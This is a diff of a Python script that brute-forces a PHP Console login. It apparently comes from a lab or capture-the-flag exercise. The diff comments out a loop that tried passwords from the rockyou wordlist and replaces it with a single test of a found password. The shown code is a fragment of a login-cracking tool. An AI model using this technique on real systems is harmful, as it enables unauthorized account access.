@@ -2,7 +2,7 @@ import requests
 import json
 import hashlib
 import base64
-import pandas as pd
+#import pandas as pd
 
 s = requests.Session()
 
@@ -19,11 +19,12 @@ def send_request(password):
     return php_console['auth']['isSuccess']
 
 if __name__ == '__main__':
-    f = open('/usr/share/wordlists/rockyou.txt', 'r')
-    for i in range(99999):
-        password = f.readline().strip()
-        print(password)
-        if send_request(password) != False:
-            print(password)
-            break
-    f.close()
+#f = open('/usr/share/wordlists/rockyou.txt', 'r')
+#   for i in range(99999):
+#       password = f.readline().strip()
+#       print(password)
+#       if send_request(password) != False:
+#           print(password)
+#           break
+#   f.close()
+    print(send_request('poohbear'))
